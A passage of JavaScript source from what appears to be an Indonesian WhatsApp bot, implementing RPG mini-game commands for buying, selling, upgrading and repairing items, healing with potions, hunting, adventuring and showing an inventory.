                            if (global.db.data.users[m.sender].diamond > upsword) {
                                global.db.data.users[m.sender].sword += 1
                                global.db.data.users[m.sender].diamond -= upsword * 1
                                global.db.data.users[m.sender].sworddurability = dursword
                                m.reply(`✔️ Sukses Mengupgrade Sword 🗡️ Seharga ${upsword} Diamond 💎` ,m)
                            } else m.reply(`Diamond Mu Tidak Cukup Untuk Mengupgrade Sword 🗡️ Seharga ${upsword} Diamond 💎`)
                            break
                            case prefix+'pickaxe':
                            if (global.db.data.users[m.sender].pickaxe == 5) return m.reply('Pickaxe mu udah *Level Max*', m)
                            if (global.db.data.users[m.sender].pickaxe == 0) return m.reply('Kamu belum mempunyai Pickaxe', m)
                            if (global.db.data.users[m.sender].diamond > uppickaxe) {
                                global.db.data.users[m.sender].pickaxe += 1
                                global.db.data.users[m.sender].diamond -= uppickaxe * 1
                                global.db.data.users[m.sender].pickaxedurability = durpickaxe
                                m.reply(`✔️ Sukses Mengupgrade Pickaxe ⛏️ Seharga ${uppickaxe} Diamond 💎` ,m)
                            } else m.reply(`Diamond Mu Tidak Cukup Untuk Mengupgrade Pickaxe ⛏️  Seharga ${uppickaxe} Diamond 💎`)
                            break
                            default:
                            return m.reply(Kchat, m)
                            }
                            break
                            case prefix+'repair': 
                switch (_type) {
                	case prefix+'fishingrod':
                            if (global.db.data.users[m.sender].fishingroddurability == 80) return m.reply('Pancingan mu belum ada kerusakan', m)
                            if (global.db.data.users[m.sender].fishingrod == 0) return m.reply('Kamu belum mempunyai Pancingan', m)
                            if (global.db.data.users[m.sender].diamond > refishingrod) {
                                global.db.data.users[m.sender].pancing += 1
                                global.db.data.users[m.sender].diamond -= refishingrod * 1
                                global.db.data.users[m.sender].fishingroddurability += drefishingrod
                                m.reply(`✔️ Sukses Mengrepair Fishingrod 🎣  Seharga ${refishingrod} Diamond 💎\n➕ ${drefishingrod} Durability` ,m)
                            } else m.reply(`Diamond Mu Tidak Cukup Untuk Merepair Fishingrod 🎣  Seharga ${refishingrod} Diamond 💎`)
                        
                        break
                        case prefix+'pickaxe':
                            if (global.db.data.users[m.sender].pickaxedurability == 80) return m.reply('Pickaxe mu belum ada kerusakan', m)
                            if (global.db.data.users[m.sender].pickaxe == 0) return m.reply('Kamu belum mempunyai Pickaxe', m)
                            if (global.db.data.users[m.sender].diamond > repickaxe) {
                                global.db.data.users[m.sender].pickaxe += 1
                                global.db.data.users[m.sender].diamond -= repickaxe * 1
                                global.db.data.users[m.sender].pickaxedurability += drepickaxe
                                m.reply(`✔️ Sukses Mengrepair Pickaxe ⛏️ Seharga ${repickaxe} Diamond 💎\n➕ ${drepickaxe} Durability` ,m)
                            } else m.reply(`Diamond Mu Tidak Cukup Untuk Merepair Pickaxe ⛏️  Seharga ${repickaxe} Diamond 💎`)
                        
                        break
                            case prefix+'sword':
                            if (global.db.data.users[m.sender].sworddurability == 80) return m.reply('Sword mu belum ada kerusakan', m)
                            if (global.db.data.users[m.sender].sword == 0) return m.reply('Kamu belum mempunyai Sword', m)
                            if (global.db.data.users[m.sender].diamond > resword) {
                                global.db.data.users[m.sender].sword += 1
                                global.db.data.users[m.sender].diamond -= resword * 1
                                global.db.data.users[m.sender].sworddurability += dresword
                                m.reply(`✔️ Sukses Mengrepair Sword 🗡️ Seharga ${resword} Diamond 💎\n➕ ${dresword} Durability` ,m)
                            } else m.reply(`Diamond Mu Tidak Cukup Untuk Merepair Sword 🗡️  Seharga ${resword} Diamond 💎`)
                        
                        break
                            
                            default:
                            return m.reply(Kchat, m)
                            }
                            break
            default:
                return hisoka.sendMessage(m.chat, { image: thumb, caption: Kchat }, {quoted: fgif })
            }
        } else if (/beli|buy/i.test(command)) {
            const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
            switch (type) {
                case prefix+'potion':
                        if (global.db.data.users[m.sender].money >= potion * count) {
                            global.db.data.users[m.sender].money -= potion * count
                            global.db.data.users[m.sender].potion += count * 1
                            m.reply(`Sukses membeli ${count} Potion Dengan Harga ${potion * count} Money \n\nGunakan Potion Dengan Ketik: *${prefix}use potion <jumlah>*`)
                        } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Potion Dengan Harga ${potion * count} Money`,m)
                    
                    break
                case prefix+'tprem':
                            if (global.db.data.users[m.sender].money >= Btprem * count) {
                                global.db.data.users[m.sender].tprem += count * 1
                                global.db.data.users[m.sender].money -= Btprem * count
                                m.reply(`Sukses Membeli ${count} Tiket Premium Dengan Harga ${Btprem * count} Money`)
                            } else m.reply(`Uang Anda Tidak Cukup`)
                        break
                case prefix+'diamond':
                        if (global.db.data.users[m.sender].money >= Bdiamond * count) {
                            global.db.data.users[m.sender].diamond += count * 1
                            global.db.data.users[m.sender].money -= Bdiamond * count
                            m.reply(`Sukses Membeli ${count} Diamond Dengan Harga ${Bdiamond * count} Money `)
                        } else m.reply(`Money Anda Tidak Cukup `)
                    
                    break
                case prefix+'common':
                        if (global.db.data.users[m.sender].money >= Bcommon * count) {
                            global.db.data.users[m.sender].common += count * 1
                            global.db.data.users[m.sender].money -= Bcommon * count
                            m.reply(`Sukses Membeli ${count} Common Crate Dengan Harga ${Bcommon * count} Money `)
                        } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Common Crate Dengan Harga ${Bcommon * count} Money \n\nBuka Crate Dengan Ketik : *${prefix}open common*`)
                    
                    break
                case prefix+'uncommon':
                        if (global.db.data.users[m.sender].money >= Buncommon * count) {
                            global.db.data.users[m.sender].uncommon += count * 1
                            global.db.data.users[m.sender].money -= Buncommon * count
                            m.reply(`Sukses Membeli ${count} Uncommon Crate Dengan Harga ${Buncommon * count} Money `)
                        } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Uncommon Crate Dengan Harga ${Buncommon * count} Money \n\nBuka Crate Dengan Ketik: *${prefix}open uncommon*`)
                   
                    break
                case prefix+'mythic':
                        if (global.db.data.users[m.sender].money >= Bmythic * count) {
                            global.db.data.users[m.sender].mythic += count * 1
                            global.db.data.users[m.sender].money -= Bmythic * count
                            m.reply(`Sukses Membeli ${count} Mythic Crate Dengan Harga ${Bmythic * count} Money `)
                        } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Mythic Crate Dengan Harga ${Bmythic* count} money\n\nBuka Crate Dengan Ketik: *${prefix}open mythic*`)
                    
                    break
                case prefix+'legendary':
                        if (global.db.data.users[m.sender].money >= Blegendary * count) {
                            global.db.data.users[m.sender].legendary += count * 1
                            global.db.data.users[m.sender].money -= Blegendary * count
                            m.reply(`Sukses Membeli ${count} Legendary Crate Dengan Harga ${Blegendary * count} Money`)
                        } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Legendary Crate Dengan Harga ${Blegendary * count} Money \n\nBuka Crate Dengan Ketik: *${prefix}open legendary*`)
                    
                    break
                case prefix+'sampah':
                        if (global.db.data.users[m.sender].money >= Bsampah * count) {
                            global.db.data.users[m.sender].sampah += count * 1
                            global.db.data.users[m.sender].money -= Bsampah * count
                            m.reply(`Sukses Membeli ${count} Sampah Dengan Harga ${Bsampah * count} money`)
                        } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Sampah Dengan Harga ${Bsampah * count} Money `)
                    
                    break
                case prefix+'armor':
                        if (global.db.data.users[m.sender].armor == 5) return m.reply('Armormu Telah *Level Max*', m)
                        if (global.db.data.users[m.sender].money > armor * 1) {
                            global.db.data.users[m.sender].armor += 1
                            global.db.data.users[m.sender].money -= armor * 1
                            m.reply(`Sukses Membeli Armor Seharga ${armor} Money` ,m)
                          
                        } else m.reply(`Uang Mu Tidak Cukup Untuk Membeli Armor Seharga ${armor} Money`)
                    
                    break
                default:
                    return m.reply(Kchat, m)
            }
        } else if (/sell|jual|/i.test(command)) {
            const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
            switch (type) {
                case prefix+'potion':
                    if (global.db.data.users[m.sender].potion >= count * 1) {
                        global.db.data.users[m.sender].money += Spotion * count
                        global.db.data.users[m.sender].potion -= count * 1
                        m.reply(`Sukses Menjual ${count} Potion Dengan Harga ${Spotion * count} Money`)
                    } else m.reply(`Potion Kamu Tidak Cukup `)
                    break
                case prefix+'common':
                    if (global.db.data.users[m.sender].common >= count * 1) {
                        global.db.data.users[m.sender].money += Scommon * count
                        global.db.data.users[m.sender].common -= count * 1
                        m.reply(`Sukses Menjual ${count} Common Crate Dengan Harga ${Scommon * count} Money`)
                    } else m.reply(`Common Crate Kamu Tidak Cukup `)
                    break
                case prefix+'uncommon':
                    if (global.db.data.users[m.sender].uncommon >= count * 1) {
                        global.db.data.users[m.sender].money += Suncommon * count
                        global.db.data.users[m.sender].uncommon -= count * 1
                        m.reply(`Sukses Menjual ${count} Uncommon Crate Dengan Harga ${Suncommon * count} Money`)
                    } else m.reply(`Uncommon Crate Kamu Tidak Cukup`)
                    break
                case prefix+'mythic':
                    if (global.db.data.users[m.sender].mythic >= count * 1) {
                        global.db.data.users[m.sender].money += Smythic * count
                        global.db.data.users[m.sender].mythic -= count * 1
                        m.reply(`Sukses Menjual ${count} Mythic Crate Dengan Harga ${Smythic * count} Money`)
                    } else m.reply(`Mythic Crate Kamu Tidak Cukup `)
                    break
                case prefix+'legendary':
                    if (global.db.data.users[m.sender].legendary >= count * 1) {
                        global.db.data.users[m.sender].money += Slegendary * count
                        global.db.data.users[m.sender].legendary -= count * 1
                        m.reply(`Sukses Menjual ${count} Legendary Crate Dengan Harga ${Slegendary * count} Money`)
                    } else m.reply(`Legendary Crate Kamu Tidak Cukup`)
                    break
                case prefix+'sampah':
                    if (global.db.data.users[m.sender].sampah >= count * 1) {
                        global.db.data.users[m.sender].sampah -= count * 1
                        global.db.data.users[m.sender].money += Ssampah * count
                        m.reply(`Sukses Menjual ${count} Sampah, Dan Anda Mendapatkan ${Ssampah * count} Money`)
                    } else m.reply(`Sampah Anda Tidak Cukup`)
                    break
                case prefix+'diamond':
                    if (global.db.data.users[m.sender].diamond >= count * 1) {
                        global.db.data.users[m.sender].diamond -= count * 1
                        global.db.data.users[m.sender].money += Sdiamond * count
                        m.reply(`Sukses Menjual ${count} Diamond, Dan Anda Mendapatkan ${Sdiamond * count} Money`)
                    } else m.reply(`Diamond Anda Tidak Cukup `)
                    break
                default:
                    return m.reply(Kchat,m)
            }
        } else if (/up|upgrade/i.test(command)) {
            const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
            switch (type) {
                case prefix+'armor':
                            if (global.db.data.users[m.sender].armor == 5) return m.reply('Armormu sudah *Level Max*', m)
                            if (global.db.data.users[m.sender].armor == 0) return m.reply('Kamu belum mempunyai Armor', m)
                            if (global.db.data.users[m.sender].diamond > uparmor) {
                                global.db.data.users[m.sender].armor += 1
                                global.db.data.users[m.sender].diamond -= uparmor * 1
                                m.reply(`✔️ Sukses Mengupgrade Armor 🥼 Seharga ${uparmor} Money` ,m)
                            } else m.reply(`Uang Mu Tidak Cukup Untuk Mengupgrade Armor 🥼 Seharga ${uparmor} Money 💹`)
                        
                        break
                        default:
                    return m.reply(Kchat,m)
                         }
                    }else if (/repair/i.test(command)) {
            const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
            switch (type) {
                case prefix+'armor':
                            if (global.db.data.users[m.sender].armor == 5) return m.reply('Armormu sudah *Level Max*', m)
                            if (global.db.data.users[m.sender].armor == 0) return m.reply('Kamu belum mempunyai Armor', m)
                            if (global.db.data.users[m.sender].diamond > uparmor) {
                                global.db.data.users[m.sender].armor += 1
                                global.db.data.users[m.sender].diamond -= uparmor * 1
                                m.reply(`✔️ Sukses Mengupgrade Armor 🥼 Seharga ${uparmor} Money` ,m)
                            } else m.reply(`Uang Mu Tidak Cukup Untuk Mengupgrade Armor 🥼 Seharga ${uparmor} Money 💹`)
                        
                        break
                        default:
                    return m.reply(Kchat)
                    
                    }
            }
    } catch (e) {
        m.reply(Kchat)
        console.log(e)
        if (isCreator) {
            for (let jid of global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != hisoka.user.jid)) {
                hisoka.sendMessage(jid, 'shop.js error\nNo: *' + m.sender.split`@`[0] + '*\nCommand: *' + m.text + '*\n\n*' + e + '*', MessageType.text)
            }
        }
    }
}
    break
case prefix+'heal': case prefix+'use': {
    let msgerror = (pickRandom(['Error', 'astagfirullah error', 'Nice Error', 'Salah format keknya :v', 'error bro', 'Kocak error :v', 'wtf error :v', 'Ciaaa error', 'error cuyy', 'dahlah (emot batu) error']))
    try {
        let msgkurang = (pickRandom(['potionmu tidak cukup', 'ciaa gk cukup potionyya :v', 'wtf gk cukup :v', 'beli potion dulu, potionmu gk cukup', 'Duaarr potionmu gk cukup', 'eyyyy potionmu kurang', 'beli dulu lah, masak mau pakai potion tapi gk ada potionnnya :v', 'minta ke orang lain suruh transfer potion, biar potionmu gk kurang :v', 'Beli potion dulu KK']))
        let msgpenuh = (pickRandom(['Nyawamu sudah penuh', 'coba deh liat inv mu, nyawamu kan dah 100 ngapai ngunain potion lagi?', 'health mu dah penuh woyy', 'ws kebek weh :v', 'nyawamu dah penuh :v', 'udh weh, udh penuh']))
        let kucing = global.db.data.users[m.sender].kucing
        let usepotion = (kucing == 0 ? 40 : '' || kucing == 1 ? 45 : '' || kucing == 2 ? 50 : '' || kucing == 3 ? 55 : '' || kucing == 4 ? 60 : '' || kucing == 5 ? 65 : '')
        let healt = global.db.data.users[m.sender].healt
        if (/use|pakai/i.test(command)) {
            try {
                let count = (/[0-9]/g.test(args[1])) ? !args[1] || args.length < 2 ? Math.max((Math.ceil((100 - global.db.data.users[m.sender].healt) / usepotion)), 1) : Math.max(args[1], 1) : Math.max((Math.ceil((100 - global.db.data.users[m.sender].healt) / usepotion)), 1)
                 let msgsucces = (pickRandom(['success memakai', 'Nice succes menggunakan', 'berhasil meminum ', 'primitif anda menggunakan', 'anda memakai', 'Anda menggunakan']) + ' *' + (count * 1) + `* 🥤Potion`)
                 if (args[0] === 'potion') {
                    if (global.db.data.users[m.sender].healt < 100) {
                        if (global.db.data.users[m.sender].potion >= count * 1) {
                            global.db.data.users[m.sender].potion -= count * 1
                            global.db.data.users[m.sender].healt += usepotion * count
                            hisoka.send2Button(m.chat, msgsucces, wm, 'inventory', prefix + 'inv', 'petualang', prefix + 'work', m)
                        } else hisoka.send2Button(m.chat, msgkurang, wm, 'beli potion', prefix + 'beli potion', 'cek inv', prefix + 'inv', m)
                    } else hisoka.send2Button(m.chat, msgpenuh, wm, 'inventory', prefix + 'inv', 'petualang', prefix + 'work', m)
                } else if (args.length > 2 && args[0] === !'potion') hisoka.send2Button(m.chat, pickRandom(['Hanya bisa menggunakan potion', 'Mau ngunain apa? Cuma bisa gunain potion :v', 'Wih mau gunain apa kamu, kan hanya bisa potion', 'Waduheck, hanya bisa potion', 'lah, mau gunain apa?, kan hanya bisa potion']) + '\nContoh penggunaan: *' + prefix + 'use potion 1*', wm, 'gunakan 1 potion', prefix + 'use potion 1', 'gunakan 2 potion', prefix + 'use potion 2', m)
            } catch (e) {
                console.log(e)
                throw msgerror
            }
        } else if (/heal/i.test(command)) {
            try {
                let count = (/[0-9]/g.test(args[0])) ? !args[0] || args.length < 1 ? Math.max((Math.ceil((100 - global.db.data.users[m.sender].healt) / usepotion)), 1) : Math.max(args[0], 1) : Math.max((Math.ceil((100 - global.db.data.users[m.sender].healt) / usepotion)), 1)
                let msgsucces = (pickRandom(['success memakai', 'Nice succes menggunakan', 'berhasil meminum ', 'primitif anda menggunakan', 'anda memakai', 'Anda menggunakan']) + ' *' + (count * 1) + `* 🥤Potion`)
                if (global.db.data.users[m.sender].healt < 100) {
                    if (global.db.data.users[m.sender].potion >= count * 1) {
                        global.db.data.users[m.sender].potion -= count * 1
                        global.db.data.users[m.sender].healt += usepotion * count
                        hisoka.send2Button(m.chat, msgsucces, wm, 'inventory', prefix + 'inv', 'petualang', prefix + 'work', m)
                    } else hisoka.send2Button(m.chat, msgkurang, wm, 'beli potion', prefix + 'shop buy potion', 'cek inv', prefix + 'inv', m)
                } else hisoka.send2Button(m.chat, msgpenuh, wm, 'inventory', prefix + 'inv', 'petualang', prefix + 'work', m)
            } catch (e) {
                console.log(e)
                throw msgerror
            }
        }
    } catch (e) {
        console.log(e)
        throw msgerror
    }
}
break
case prefix+'berburu': {
    let ___timers = (new Date - global.db.data.users[m.sender].as)
    let _timers = (500000 - ___timers)
    let timers = clockString(_timers) 
    let user = global.db.data.users[m.sender]
    if (new Date - global.db.data.users[m.sender].as > 500000) {
let randomaku1 = `${Math.floor(Math.random() * 7)}`
let randomaku2 = `${Math.floor(Math.random() * 7)}`
let randomaku4 = `${Math.floor(Math.random() * 7)}`
let randomaku3 = `${Math.floor(Math.random() * 7)}`
let randomaku5 = `${Math.floor(Math.random() * 7)}`
let randomaku6 = `${Math.floor(Math.random() * 7)}`
let randomaku7 = `${Math.floor(Math.random() * 7)}`
let randomaku8 = `${Math.floor(Math.random() * 7)}`
let randomaku9 = `${Math.floor(Math.random() * 7)}`
let randomaku10 = `${Math.floor(Math.random() * 7)}`
let randomaku11 = `${Math.floor(Math.random() * 7)}`
let randomaku12 = `${Math.floor(Math.random() * 7)}`

let rbrb1 = (randomaku1 * 1)
let rbrb2 = (randomaku2 * 1) 
let rbrb3 = (randomaku3 * 1)
let rbrb4 = (randomaku4 * 1)
let rbrb5 = (randomaku5 * 1)
let rbrb6 = (randomaku6 * 1)
let rbrb7 = (randomaku7 * 1)
let rbrb8 = (randomaku8 * 1)
let rbrb9 = (randomaku9 * 1)
let rbrb10 = (randomaku10 * 1)
let rbrb11 = (randomaku11 * 1)
let rbrb12 = (randomaku12 * 1)

zero1 = `${rbrb1}`
zero2 = `${rbrb2}`
zero3 = `${rbrb3}`
zero4 = `${rbrb4}`
zero5 = `${rbrb5}`
zero6 = `${rbrb6}`
zero7 = `${rbrb7}`
zero8 = `${rbrb8}`
zero9 = `${rbrb9}`
zero10 = `${rbrb10}`
zero11 = `${rbrb11}`
zero12 = `${rbrb12}`

hsl = `*━━━━━━━━━[ Hasil Berburu]━━━━━━━━━*

 *🐂 = [ ${zero1} ]*			*🐃 = [ ${zero7} ]*
 *🐅 = [ ${zero2} ]*			 *🐮 = [ ${zero8} ]*
 *🐘 = [ ${zero3} ]*			 *🐒 = [ ${zero9} ]*
 *🐐 = [ ${zero4} ]*			 *🐗 = [ ${zero10} ]*
 *🐼 = [ ${zero5} ]*			 *🐖 = [ ${zero11} ]*
 *🐊= [ ${zero6} ]*			  *🐓 = [${zero12} ]*

`
global.db.data.users[m.sender].banteng += rbrb1
global.db.data.users[m.sender].harimau += rbrb2
global.db.data.users[m.sender].gajah += rbrb3
global.db.data.users[m.sender].kambing += rbrb4
global.db.data.users[m.sender].panda+= rbrb5
global.db.data.users[m.sender].buaya += rbrb6
global.db.data.users[m.sender].kerbau += rbrb7
global.db.data.users[m.sender].sapi += rbrb8
global.db.data.users[m.sender].monyet += rbrb9
global.db.data.users[m.sender].babihutan += rbrb10
global.db.data.users[m.sender].babi += rbrb11
global.db.data.users[m.sender].ayam += rbrb12

setTimeout(() => {
                     hisoka.sendButton(m.chat, hsl, wm, 'Kandang', '#kandang',m)
                     }, 20000) 
               
                     setTimeout(() => {
                     m.reply(`*DUAR*`)
                      }, 18000)
                    
                     setTimeout(() => {
                     m.reply('KPUMNN !!')
                     }, 15000) 
                    
                     setTimeout(() => {
                     m.reply('DORR DORR !!')
                     }, 14000) 
                     
                     setTimeout(() => {
                     m.reply('_Sedang Berburu..._')
                     }, 0) 
  user.as = new Date * 1
    } else hisoka.sendButton(m.chat, `📍 Sepertinya Kakak Sudah Kecapekan\nSilahkan Istirahat dulu Untuk melanjutkan berburu !\n🕖 *${timers}*`, wm, 'Inventory', '.inv',m )
}
break
case prefix+'kandang': { 
 let levelling = require('./lib/levelling')
  let banteng = global.db.data.users[m.sender].banteng
  let harimau = global.db.data.users[m.sender].harimau
 let gajah = global.db.data.users[m.sender].gajah
let kambing = global.db.data.users[m.sender].kambing
let panda = global.db.data.users[m.sender].panda
 let buaya = global.db.data.users[m.sender].buaya
 let kerbau = global.db.data.users[m.sender].kerbau
let sapi = global.db.data.users[m.sender].sapi
 let monyet = global.db.data.users[m.sender].monyet
 let babihutan = global.db.data.users[m.sender].babihutan
 let babi = global.db.data.users[m.sender].babi
 let ayam = global.db.data.users[m.sender].ayam

let zer = `
*—「 KANDANG 🐾 」—*
    
 *◩   ️ 🐂 = [ ${banteng} ] Ekor Banteng*
 *◩   ️ 🐅 = [ ${harimau} ] Ekor Harimau*
 *◩   ️ 🐘 = [ ${gajah} ] Ekor Gajah*
 *◩   ️ 🐐 = [ ${kambing} ] Ekor Kambing*
 *◩   ️ 🐼 = [ ${panda} ] Ekor Panda*
 *◩   ️ 🐊 = [ ${buaya} ] Ekor Buaya*
 *◩   ️ 🐃 = [ ${kerbau} ] Ekor Kerbau*
 *◩   ️ 🐮 = [ ${sapi} ] Ekor Sapi*
 *◩   ️ 🐒 = [ ${monyet} ] Ekor Monyet*
 *◩   ️ 🐗 = [ ${babihutan} ] Ekor Babi Hutan*
 *◩   ️ 🐖 = [ ${babi} ] Ekor Babi*
 *◩   ️ 🐓 = [ ${ayam} ] Ekor Ayam*
 `
 hisoka.sendBut(m.chat, zer,wm, 'Toko', '.pasar', m)
} 
break
case prefix+'berpetualang': case prefix+'work': case prefix+'mulung': case prefix+'adventure': {
    try { 
        let __timers = (new Date - global.db.data.users[m.sender].lastadventure)
        let _timers = (300000 - __timers) 
        let timers = clockString(_timers)
        if (global.db.data.users[m.sender].healt > 79) {
            if (new Date - global.db.data.users[m.sender].lastadventure > 300000) {
            let armor = global.db.data.users[m.sender].armor
            let rubah = global.db.data.users[m.sender].rubah
            let kuda = global.db.data.users[m.sender].kuda
            let kucing = global.db.data.users[m.sender].kucing
            let anjing = global.db.data.users[m.sender].anjing
            let ____health = `${Math.floor(Math.random() * 101)}`.trim()
            let ___health = (____health * 1)
            let kucingnya = (kucing == 0? 0 : '' || kucing == 1 ? 5 : '' || kucing == 2 ? 10 : '' || kucing == 3 ? 15 : '' || kucing == 4 ? 21 : ''  || kucing == 5 ? 30 : '')
            let armornya = (armor == 0 ? 0 : '' || armor == 1 ? 5 : '' || armor == 2 ? 10 : '' || armor == 3 ? 15 : '' || armor == 4 ? 21 : '' || armor == 5 ? 30 : '')
            let __health = (___health > 60 ? ___health - kucingnya - armornya : ___health)
            let healt = (kucing == 0 && armor == 0 ? pickRandom(['100', '99', '98', '97', '96', '95', '94', '93', '92', '91', '90']) : kucing > 0 && armor > 0 ? __health : ___health)
            let exp = (Math.floor(Math.random() * 400) + (kuda * 70))
            let uang = (Math.floor(Math.random() * 400) + (anjing * 70))
            let _potion = `${Math.floor(Math.random() * 2)}`.trim()
            let potion = (_potion * 1)
            let _diamond = (rubah == 0 ? pickRandom(['0', '1', '0', '1', '0', '1', '0']) : '' || rubah == 1 ? pickRandom(['0', '1', '0', '1']) : '' || rubah == 2 ? pickRandom(['0', '1', '0', '1', '2']) : '' || rubah == 3 ? pickRandom(['0', '1', '0', '2', '2', '0']) : '' || rubah == 4 ? pickRandom(['0', '1', '1', '2', '1', '1', '0']) : '' || rubah == 5 ? pickRandom(['0', '0', '1', '2', '2', '1', '1', '0']) : '' )
            let diamond = (_diamond * 1)
            let _common = `${Math.floor(Math.random() * 3)}`.trim()
            let common = (_common * 1)
            let _uncommon = `${Math.floor(Math.random() * 2)}`.trim()
            let uncommon = (_uncommon * 1) 
            let _mythic = `${pickRandom(['1', '0', '0', '1'])}`
            let mythic = (_mythic * 1)
            let _legendary = `${pickRandom(['1', '0', '0', '0'])}`
            let sampah = `${Math.floor(Math.random() * 300)}`.trim()
            let legendary = (_legendary * 1)
            let _kayu = `${Math.floor(Math.random() * 3)}`.trim()
            let kayu = (_kayu * 1)
            let _batu = `${Math.floor(Math.random() * 2)}`.trim()
            let batu = (_batu * 1)
            let _string = `${Math.floor(Math.random() * 2)}`.trim()
            let string = (_string * 1)
            let _iron = `${Math.floor(Math.random() * 2)}`.trim()
            let iron = (_iron * 1)
            let str = `
❤️ Nyawa mu berkurang -${healt * 1} karena Kamu telah berpetualang sampai ${pickRandom(['🇯🇵 Jepang', '🇰🇷 Korea', '🇮🇳 India', '🇺🇲 Amerika', '🇵🇸 Palestin', '🇮🇶 Iraq', '🇸🇦 Arab', '🇵🇰 Pakistan', '🇩🇪 German', '🇫🇮 Finlandia', 'Ke bawa dunia mimpi 😱', 'Ujung dunia 🌏', 'Mars 👽', 'Bulan 🌚', 'Pluto 😱', 'Matahari 🌞', 'Hatinya dia ♥️', '...'])} dan mendapatkan
🧬 *exp:* ${exp} 
💵 *uang:* ${uang}
🗑️ *sampah:* ${sampah}${potion == 0 ? '' : `\n*🥤Potion:* ` + potion + ''}${iron == 0 ? '' : `\n*⛓️Iron:* ` + iron + ''}${kayu == 0 ? '' : `\n*🪵Kayu:* ` + kayu + ''}${batu == 0 ? '' : `\n*🪨Batu:* ` + batu + ''}${string == 0 ? '' : `\n*🕸️String:* ` + string + ''}${diamond == 0 ? '' : `\n*💎diamond:* ` + diamond + ''}${common == 0 ? '' : `\n*📦common crate:* ` + common + ''}${uncommon == 0 ? '' : `\n*🛍️uncommon crate:* ` + uncommon + ''}
`.trim()
m.reply(await str.trim())
            if (mythic > 0) {
                   global.db.data.users[m.sender].mythic += mythic * 1
                   m.reply('*Selamat anda mendapatkan item Rare yaitu*\n' + mythic + `🎁Mythic Crate`)
            }
            if (legendary > 0) {
                global.db.data.users[m.sender].legendary += legendary * 1
                m.reply('*Selamat anda mendapatkan item Epic yaitu*\n' + legendary + `🎁Legendary Crate`)
            }
            global.db.data.users[m.sender].healt -= healt * 1
            global.db.data.users[m.sender].exp += exp * 1
            global.db.data.users[m.sender].money += uang * 1
            global.db.data.users[m.sender].potion += potion * 1
            global.db.data.users[m.sender].diamond += diamond * 1
            global.db.data.users[m.sender].common += common * 1 
            global.db.data.users[m.sender].uncommon += uncommon * 1
            global.db.data.users[m.sender].sampah += sampah * 1
            global.db.data.users[m.sender].iron += iron * 1
            global.db.data.users[m.sender].batu += batu * 1
            global.db.data.users[m.sender].kayu += kayu * 1
            global.db.data.users[m.sender].string += string * 1
            global.db.data.users[m.sender].lastadventure = new Date * 1
            } else m.reply(`Anda sudah bekerja keras hari ini, silahkan menunggu sampai *${timers}*`)
        } else m.reply('Minimal 80 health untuk bisa bercocok tanam, beli obat dulu biar kuat dengan ketik *' + prefix + 'shop buy potion <jumlah>*\ndan ketik *' + prefix + 'use potion <jumlah>*\n\n_Untuk mendapat money dan potion gratis ketik_ *' + prefix + 'claim*')
    } catch (e) {
        console.log(e)
        throw m.reply('err')
    }
}
break    
case prefix+'inv': case prefix+'inventory': {
let levelling = require('./lib/levelling')
let fetch = require('node-fetch')
let PhoneNumber = require('awesome-phonenumber')
let date = global.wm
    let { registered, age, lastrampok, lastdagang, lastcodereg, lastberkebon, lasthourly, lastberburu, lastbansos, lastadventure, lastfishing, lastwar, lastduel, lastmining, lastdungeon, lastclaim, lastweekly, lastmonthly } = global.db.data.users[m.sender]

    let healt = global.db.data.users[m.sender].healt
    let lapar = global.db.data.users[m.sender].laper
    let haus = global.db.data.users[m.sender].haus
    let usrname = global.db.data.users[m.sender].name
    let stamina = global.db.data.users[m.sender].stamina
    let armor = global.db.data.users[m.sender].armor 
    let sword = global.db.data.users[m.sender].sword
    let sdurability = global.db.data.users[m.sender].sworddurability
    let warn = global.db.data.users[m.sender].warn
    let premium = global.db.data.users[m.sender].premium
    let tprem = global.db.data.users[m.sender].tprem
    let pancing = global.db.data.users[m.sender].pancing
    let fdurability = global.db.data.users[m.sender].fishingroddurability
    let role = global.db.data.users[m.sender].role
    let pickaxe = global.db.data.users[m.sender].pickaxe
    let pdurability = global.db.data.users[m.sender].pickaxedurability

    let psepick = global.db.data.users[m.sender].psepick
    let psenjata = global.db.data.users[m.sender].psenjata

    let ikan= global.db.data.users[m.sender].ikan
    let nila= global.db.data.users[m.sender].nila
    let bawal= global.db.data.users[m.sender].bawal
    let lele= global.db.data.users[m.sender].lele
    let udangb= global.db.data.users[m.sender].udang

    let apel = global.db.data.users[m.sender].apel
    let ayamg = global.db.data.users[m.sender].ayamg
    let ayamb = global.db.data.users[m.sender].ayamb
    let sapir = global.db.data.users[m.sender].sapir
    let ssapi = global.db.data.users[m.sender].ssapi
    let kayu = global.db.data.users[m.sender].kayu
    let string = global.db.data.users[m.sender].string
    let emas = global.db.data.users[m.sender].emas
    let besi = global.db.data.users[m.sender].iron
    let batu = global.db.data.users[m.sender].batu
    let sapi = global.db.data.users[m.sender].sapi
    let ayam = global.db.data.users[m.sender].ayam
    let babi = global.db.data.users[m.sender].babi
    let banteng = global.db.data.users[m.sender].banteng
    let pet = global.db.data.users[m.sender].pet
    let kucing = global.db.data.users[m.sender].kucing
    let _kucing = global.db.data.users[m.sender].anakkucing
    let rubah = global.db.data.users[m.sender].rubah
    let _rubah = global.db.data.users[m.sender].anakrubah
    let kuda = global.db.data.users[m.sender].kuda
    let _kuda = global.db.data.users[m.sender].anakkuda
    let serigala = global.db.data.users[m.sender].serigala
    let _serigala = global.db.data.users[m.sender].anakserigala
    let phonix = global.db.data.users[m.sender].phonix
    let _phonix = global.db.data.users[m.sender].anakphonix
    let griffin = global.db.data.users[m.sender].griffin
